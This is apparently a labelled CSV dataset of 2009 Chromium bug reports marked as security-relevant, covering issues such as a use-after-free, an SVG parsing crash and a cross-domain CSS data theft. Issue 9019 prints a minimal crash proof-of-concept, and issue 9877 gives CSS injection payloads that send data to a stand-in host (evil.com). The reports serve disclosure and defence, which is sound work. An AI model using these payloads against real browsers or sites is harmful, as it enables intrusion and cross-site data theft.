,id,issue_id,date,report,Security,summary,description
8364,8364,8757,13-Mar-09,Issue 8757 : Cross-origin XMLHttpRequest is always allowed 2     &nbsp;   abarth@chromium.org    See https://bugs.webkit.org/show_bug.cgi?id=24575 We'll get the fix in our next merge  but we need this fix in our beta branch: http://trac.webkit.org/changeset/41667 ,1,Issue 8757 : Cross-origin XMLHttpRequest is always allowed 2     &nbsp,abarth@chromium.org    See https://bugs.webkit.org/show_bug.cgi id=24575 We'll get the fix in our next merge  but we need this fix in our beta branch: http://trac.webkit.org/changeset/41667 
8468,8468,8864,17-Mar-09,Issue 8864 : Security: CANVAS implmentation crashes 2     &nbsp;   lcamtuf    [See internal bug 1157004 for some context] Although some fixes were made earlier  Chrome 2 still seems to be crashing with my &lt;CANVAS&gt; fuzzer  http://lcamtuf.cordump.cx/canvas/ . I did not investigate in more detail  but we should probably make sure it passes the tests smoothly before releasing. ,1,Issue 8864 : Security: CANVAS implmentation crashes 2     &nbsp,lcamtuf    [See internal bug 1157004 for some context] Although some fixes were made earlier  Chrome 2 still seems to be crashing with my &lt CANVAS&gt fuzzer  http://lcamtuf.cordump.cx/canvas/ . I did not investigate in more detail  but we should probably make sure it passes the tests smoothly before releasing. 
8469,8469,8865,17-Mar-09,Issue 8865 : Old chrome.dll left behind after upgrade  recognized by Secunia PSI as a potential security threat 1 person starred this issue and may be notified of changes.   &nbsp;   garen.pa...@gmail.com    After upgrading to 1.0.154.48  chrome.dll for version 1.0.154.46 is still left behind in user-specific data directory. In my case on Win XP it's: C:\Documents and Settings\Garen.I530Q6600\Local Settings\Application Data\Google\Chrome\Application\1.0.154.46 I'm guessing this is by design  however  Secunia PSI recognizes chrome.dll from that version as a security threat (screenshot attached) and recommends upgrading to the latest version. Of course  I am running the latest version  it just doesn't know that. Found references to other users running into this: http://secunia.com/community/forum/thread/show/1328/after_autopatch_to_chro me_1_0_154_48_chrome_still_insecure Suggest cleaning up old data after a successful upgrade  or providing some easy way to remove old stale data. Secunia PSI scrn.jpg 212 KB &nbsp; View &nbsp; Download ,1,Issue 8865 : Old chrome.dll left behind after upgrade  recognized by Secunia PSI as a potential security threat 1 person starred this issue and may be notified of changes.   &nbsp,garen.pa...@gmail.com    After upgrading to 1.0.154.48  chrome.dll for version 1.0.154.46 is still left behind in user-specific data directory. In my case on Win XP it's: C:\Documents and Settings\Garen.I530Q6600\Local Settings\Application Data\Google\Chrome\Application\1.0.154.46 I'm guessing this is by design  however  Secunia PSI recognizes chrome.dll from that version as a security threat (screenshot attached) and recommends upgrading to the latest version. Of course  I am running the latest version  it just doesn't know that. Found references to other users running into this: http://secunia.com/community/forum/thread/show/1328/after_autopatch_to_chro me_1_0_154_48_chrome_still_insecure Suggest cleaning up old data after a successful upgrade  or providing some easy way to remove old stale data. Secunia PSI scrn.jpg 212 KB &nbsp View &nbsp Download 
8506,8506,8903,17-Mar-09,Issue 8903 : Sharing Login details in different TAB 1 person starred this issue and may be notified of changes.   &nbsp;   bazid.gauhati    Hi  Say if I logged in to one tab for any google account   then if I open a new tab  then it inherits the login details from the previous TAB. But as per the early annoucement  the TABs doesnt share any details and they ran in their own process. ,1,Issue 8903 : Sharing Login details in different TAB 1 person starred this issue and may be notified of changes.   &nbsp,bazid.gauhati    Hi  Say if I logged in to one tab for any google account   then if I open a new tab  then it inherits the login details from the previous TAB. But as per the early annoucement  the TABs doesnt share any details and they ran in their own process. 
8614,8614,9019,19-Mar-09,Issue 9019 : zdi-can-464: malformed svglist parsing code execution 3   Back to list Status:&nbsp; Fixed Owner:&nbsp; mal.chromium Closed:&nbsp; May 2009 Cc:&nbsp; deanm@chromium.org   ian@chromium.org   skylined@chromium.org   abarth@chromium.org   mal.chromium   karen@chromium.org   chromium...@googlegroups.com Security OS- All Pri- 0 Type- Bug Area- WebKit This issue is read-only. &nbsp;   whbeers    minimal PoC  crafted by lcamtuf@gmail.com: &lt;script&gt; var p = document.createElementNS(&quot; http://www.w3.org/2000/svg&quot; &quot;path&quot;); p.pathSegList.insertItemBefore(null 1); &lt;/script&gt; ,1,Issue 9019 : zdi-can-464: malformed svglist parsing code execution 3   Back to list Status:&nbsp,Fixed Owner:&nbsp mal.chromium Closed:&nbsp May 2009 Cc:&nbsp deanm@chromium.org   ian@chromium.org   skylined@chromium.org   abarth@chromium.org   mal.chromium   karen@chromium.org   chromium...@googlegroups.com Security OS- All Pri- 0 Type- Bug Area- WebKit This issue is read-only. &nbsp whbeers    minimal PoC  crafted by lcamtuf@gmail.com: &lt script&gt var p = document.createElementNS(&quot http://www.w3.org/2000/svg&quot &quot path&quot ) p.pathSegList.insertItemBefore(null 1) &lt /script&gt 
8640,8640,9045,19-Mar-09,Issue 9045 : Indic scripts punctuation DANDA (U+0964) showing as boxes in Chrome 1 person starred this issue and may be notified of changes.   &nbsp;   xlyuan@chromium.org    This is not a regression  happens on all channels and trunk build. Build: 2.0.171.0 (Developer Build 12126) OS: Any Other Browsers: Safari4: OK WebkitNightly: OK Firefox3.0.7: OK IE8: OK Steps: 1. Launch Chrome 2. Go to http://amarblog.com/shawon/43327 3. Observe Result: Indic scripts punctuation danda (U+0964) showing as boxes in Chrome Expected: Correct danda character should display Notes: 1. Please note that  the dandas used at the end of each paragraph are showing correctly  but the ones used in the middle of the paragraph are wrong 2. Several other pages which also have this problem: &gt;&gt; http://prothom-aloblog.com/users/base/rrahul178/110 &gt;&gt; http://bangla.irib.ir/index.php? option=com_content&amp;task=view&amp;id=8875&amp;Itemid=66 &gt;&gt; http://priyo.com/content/Ã Â¦ÂÃ Â¦ÂÃ Â¦Â¾Ã Â¦Â¨Ã Â§ÂÃ Â¦Â°-Ã Â¦Â¦Ã Â§ÂÃ Â¦Â¯Ã Â¦Â¼Ã Â¦Â¾Ã Â¦Â¯Ã Â¦?Ã Â¦Â¨Ã Â¦Â¬Ã Â§ÂÃ Â¦ÂÃ Â§Â-Ã Â¦ÂÃ Â¦ÂªÃ Â¦Â®Ã Â¦Â¾Ã Â¦?Ã Â¦ÂÃ Â¦Â°Ã Â¦?Ã Â¦Â¹Ã Â¦Â¯Ã Â¦?Ã Â¦Â®Ã Â¦Â¾Ã Â¦Â¤Ã Â§ÂÃ Â¦Â°Ã Â¥Â¤ 3. Probably DOUBLE DANDA (U+0965) has the same problem Indic_Scripts_Danda.jpg 444 KB &nbsp; View &nbsp; Download ,1,Issue 9045 : Indic scripts punctuation DANDA (U+0964) showing as boxes in Chrome 1 person starred this issue and may be notified of changes.   &nbsp,xlyuan@chromium.org    This is not a regression  happens on all channels and trunk build. Build: 2.0.171.0 (Developer Build 12126) OS: Any Other Browsers: Safari4: OK WebkitNightly: OK Firefox3.0.7: OK IE8: OK Steps: 1. Launch Chrome 2. Go to http://amarblog.com/shawon/43327 3. Observe Result: Indic scripts punctuation danda (U+0964) showing as boxes in Chrome Expected: Correct danda character should display Notes: 1. Please note that  the dandas used at the end of each paragraph are showing correctly  but the ones used in the middle of the paragraph are wrong 2. Several other pages which also have this problem: &gt &gt http://prothom-aloblog.com/users/base/rrahul178/110 &gt &gt http://bangla.irib.ir/index.php option=com_content&amp task=view&amp id=8875&amp Itemid=66 &gt &gt http://priyo.com/content/Ã Â¦ÂÃ Â¦ÂÃ Â¦Â¾Ã Â¦Â¨Ã Â§ÂÃ Â¦Â°-Ã Â¦Â¦Ã Â§ÂÃ Â¦Â¯Ã Â¦Â¼Ã Â¦Â¾Ã Â¦Â¯Ã Â¦ Ã Â¦Â¨Ã Â¦Â¬Ã Â§ÂÃ Â¦ÂÃ Â§Â-Ã Â¦ÂÃ Â¦ÂªÃ Â¦Â®Ã Â¦Â¾Ã Â¦ Ã Â¦ÂÃ Â¦Â°Ã Â¦ Ã Â¦Â¹Ã Â¦Â¯Ã Â¦ Ã Â¦Â®Ã Â¦Â¾Ã Â¦Â¤Ã Â§ÂÃ Â¦Â°Ã Â¥Â¤ 3. Probably DOUBLE DANDA (U+0965) has the same problem Indic_Scripts_Danda.jpg 444 KB &nbsp View &nbsp Download 
8889,8889,9303,25-Mar-09,Issue 9303 : Security: possible use-after-free in OpenTypeUtilities.cpp 1 person starred this issue and may be notified of changes.   &nbsp;   taviso    Check out this routine from OpenTypeUtilities.cpp: 177 bool getEOTHeader(SharedBuffer* fontData  Vector&lt;uint8_t  512&gt;&amp; eotHeader  size_t&amp; overlayDst  size_t&amp; overlaySrc  size_t&amp; overlayLength) 178 { ... prefix is now a pointer to eotHeader.data() 186 eotHeader.resize(sizeof(EOTPrefix)); 187 EOTPrefix* prefix = reinterpret_cast&lt;EOTPrefix*&gt;(eotHeader.data()); 188 ... Now eotHeader is passed to appendBigEndianStringToEOTHeader() 309 appendBigEndianStringToEOTHeader(eotHeader  familyName  familyNameLength); 310 appendBigEndianStringToEOTHeader(eotHeader  subfamilyName  subfamilyNameLength); 311 appendBigEndianStringToEOTHeader(eotHeader  versionString  versionStringLength); 312 ... Continue using the prefix pointer received earlier from eotHeader.data(): 325 prefix-&gt;eotSize = eotHeader.size() + fontData-&gt;size(); 326 ... But Check out appendBigEndianStringToEOTHeader(): 164 static void appendBigEndianStringToEOTHeader(Vector&lt;uint8_t  512&gt;&amp; eotHeader  const BigEndianUShort* string  unsigned short length) 165 { 166 size_t size = eotHeader.size(); 167 eotHeader.resize(size + length + 2 * sizeof(unsigned short)); ... I'm not an expert on the codebase  but surely this now invalidates any previous pointer received from .data()  as this must have to realloc() at some level? If the backing allocation had to be moved by the system allocator  then presumably you're now going to be writing to freed memory  that may have been allocated somewhere else? I don't have a testcase  this is from purely reading the code. ,1,Issue 9303 : Security: possible use-after-free in OpenTypeUtilities.cpp 1 person starred this issue and may be notified of changes.   &nbsp,taviso    Check out this routine from OpenTypeUtilities.cpp: 177 bool getEOTHeader(SharedBuffer* fontData  Vector&lt uint8_t  512&gt &amp eotHeader  size_t&amp overlayDst  size_t&amp overlaySrc  size_t&amp overlayLength) 178 { ... prefix is now a pointer to eotHeader.data() 186 eotHeader.resize(sizeof(EOTPrefix)) 187 EOTPrefix* prefix = reinterpret_cast&lt EOTPrefix*&gt (eotHeader.data()) 188 ... Now eotHeader is passed to appendBigEndianStringToEOTHeader() 309 appendBigEndianStringToEOTHeader(eotHeader  familyName  familyNameLength) 310 appendBigEndianStringToEOTHeader(eotHeader  subfamilyName  subfamilyNameLength) 311 appendBigEndianStringToEOTHeader(eotHeader  versionString  versionStringLength) 312 ... Continue using the prefix pointer received earlier from eotHeader.data(): 325 prefix-&gt eotSize = eotHeader.size() + fontData-&gt size() 326 ... But Check out appendBigEndianStringToEOTHeader(): 164 static void appendBigEndianStringToEOTHeader(Vector&lt uint8_t  512&gt &amp eotHeader  const BigEndianUShort* string  unsigned short length) 165 { 166 size_t size = eotHeader.size() 167 eotHeader.resize(size + length + 2 * sizeof(unsigned short)) ... I'm not an expert on the codebase  but surely this now invalidates any previous pointer received from .data()  as this must have to realloc() at some level If the backing allocation had to be moved by the system allocator  then presumably you're now going to be writing to freed memory  that may have been allocated somewhere else I don't have a testcase  this is from purely reading the code. 
9417,9417,9860,8-Apr-09,Issue 9860 : ChromeHTML URI handler vulnerability 3     &nbsp;   roisaltzman    A vulnerability in the ChromeHTML URI handler allows an attacker to bypass the Same Origin Policy for any site and also enumerate victims files and directories. When loaded in Internet Explorer  a specially crafted HTML page can launch Google Chrome with an arbitrary URI without requiring any user interaction. A more detailed and technical security advisory explaining the issues is attached. Google Chrome Advisory.doc 147 KB &nbsp; Download ,1,Issue 9860 : ChromeHTML URI handler vulnerability 3     &nbsp,roisaltzman    A vulnerability in the ChromeHTML URI handler allows an attacker to bypass the Same Origin Policy for any site and also enumerate victims files and directories. When loaded in Internet Explorer  a specially crafted HTML page can launch Google Chrome with an arbitrary URI without requiring any user interaction. A more detailed and technical security advisory explaining the issues is attached. Google Chrome Advisory.doc 147 KB &nbsp Download 
9432,9432,9877,8-Apr-09,Issue 9877 : Security: cross domain thefts via CSS string property injection 2     &nbsp;   scarybeasts    This bug is kind of annoying. The hope is that something can be done at the browser level. We really don't want to have to make sweeping changes to lots of our applications  and generally burden web apps with more web browser issues. This affects Chrome  Safari  IE  Opera and FF. But let's keep this bug Chrome-private whilst we debate what can be done (and protect our customers first :) The attack involves cross-domain CSS stylesheet loading. Because the CSS parser is very lax  it will skip over any amount of preceding and following junk  in its quest to find a valid selector. Here is an example of a valid selector: body { background-image: url(' http://www.evil.com/blah'); } And here is an example of a valid selector embedded in an XML document (this is a paraphrase of a real example low-severity attack): &lt;photo_comment from=&quot;evil&quot;&gt; blah { blah:0 } body { background-image: url(' http://www.evil.com/&lt;/photo_comment&gt;&lt;photo_comment from=&quot;trusted&quot; url=&quot;url_with_key_to_hidden_photo&quot;&gt;some secret comment&lt;/photo_comment&gt;&lt;photo_comment from=&quot;evil&quot;&gt; ');}&lt;/photo_comment&gt; As you can see  if the attacker can inject a couple of strings into a trusted response  there is a useful attack here. The data is stolen cross domain with e.g. window.getComputedStyle(body_element  null).getPropertyValue('background-image'); (Note that the seemingly redundant blah { blah:0 } selector is to resync the CSS parser to make sure the evil descriptor parses properly). There are a surprising number of places in our products where an attacker can do this. It can apply to HTML  XML  JSON  XHTML  etc. The main common construct that prevents exploitation is newlines. Obviously  newlines cannot be considered a defense! The exploitable places in Google include some JSON and XML data APIs that return responses on a single line. Some of our XHTML / HTML just happens to be emitted this way too. Regarding JSON and XML  note that it is not currently a security requirement to escape ' and &quot; (XML values) or ' (JSON values within double quoted strings). Nor should we make it a requirement. Regarding how to fix the browser  here are some starting ideas (from an ise-team brainstorm). 1) When loading cross-domain CSS  engage a stricter parsing mode that stops on first syntactic (but not sematic of course) errors. 2) Same as 1)  but also only engage when the MIME type is not CSS. 3) Some variant of 1) or 2) but only engage when X-Content-Type-Options: nosniff is seen (won't help most of the internet). 4) When loading cross-domain CSS  do not send cookies (probably breaks the internet :-/ ) Please  feel free to cc: additional people who may be able to help. But try and keep within Google for now. ,1,Issue 9877 : Security: cross domain thefts via CSS string property injection 2     &nbsp,scarybeasts    This bug is kind of annoying. The hope is that something can be done at the browser level. We really don't want to have to make sweeping changes to lots of our applications  and generally burden web apps with more web browser issues. This affects Chrome  Safari  IE  Opera and FF. But let's keep this bug Chrome-private whilst we debate what can be done (and protect our customers first :) The attack involves cross-domain CSS stylesheet loading. Because the CSS parser is very lax  it will skip over any amount of preceding and following junk  in its quest to find a valid selector. Here is an example of a valid selector: body { background-image: url(' http://www.evil.com/blah') } And here is an example of a valid selector embedded in an XML document (this is a paraphrase of a real example low-severity attack): &lt photo_comment from=&quot evil&quot &gt blah { blah:0 } body { background-image: url(' http://www.evil.com/&lt /photo_comment&gt &lt photo_comment from=&quot trusted&quot url=&quot url_with_key_to_hidden_photo&quot &gt some secret comment&lt /photo_comment&gt &lt photo_comment from=&quot evil&quot &gt ') }&lt /photo_comment&gt As you can see  if the attacker can inject a couple of strings into a trusted response  there is a useful attack here. The data is stolen cross domain with e.g. window.getComputedStyle(body_element  null).getPropertyValue('background-image') (Note that the seemingly redundant blah { blah:0 } selector is to resync the CSS parser to make sure the evil descriptor parses properly). There are a surprising number of places in our products where an attacker can do this. It can apply to HTML  XML  JSON  XHTML  etc. The main common construct that prevents exploitation is newlines. Obviously  newlines cannot be considered a defense! The exploitable places in Google include some JSON and XML data APIs that return responses on a single line. Some of our XHTML / HTML just happens to be emitted this way too. Regarding JSON and XML  note that it is not currently a security requirement to escape ' and &quot (XML values) or ' (JSON values within double quoted strings). Nor should we make it a requirement. Regarding how to fix the browser  here are some starting ideas (from an ise-team brainstorm). 1) When loading cross-domain CSS  engage a stricter parsing mode that stops on first syntactic (but not sematic of course) errors. 2) Same as 1)  but also only engage when the MIME type is not CSS. 3) Some variant of 1) or 2) but only engage when X-Content-Type-Options: nosniff is seen (won't help most of the internet). 4) When loading cross-domain CSS  do not send cookies (probably breaks the internet :-/ ) Please  feel free to cc: additional people who may be able to help. But try and keep within Google for now. 
9532,9532,9980,10-Apr-09,Issue 9980 : Support X-Frame-Options in 2.0 release branch 1 person starred this issue and may be notified of changes.   &nbsp;   abarth@chromium.org    We should support the X-Frame-Options ClickJacking mitigation in our 2.0 release branch. This is already implemented in WebKit: http://trac.webkit.org/changeset/42333 It should just be a matter of integrating that change to the release branch. We might have to clear up the related LayoutTests first  see http://code.google.com/p/chromium/issues/detail?id=9962 ,1,Issue 9980 : Support X-Frame-Options in 2.0 release branch 1 person starred this issue and may be notified of changes.   &nbsp,abarth@chromium.org    We should support the X-Frame-Options ClickJacking mitigation in our 2.0 release branch. This is already implemented in WebKit: http://trac.webkit.org/changeset/42333 It should just be a matter of integrating that change to the release branch. We might have to clear up the related LayoutTests first  see http://code.google.com/p/chromium/issues/detail id=9962 
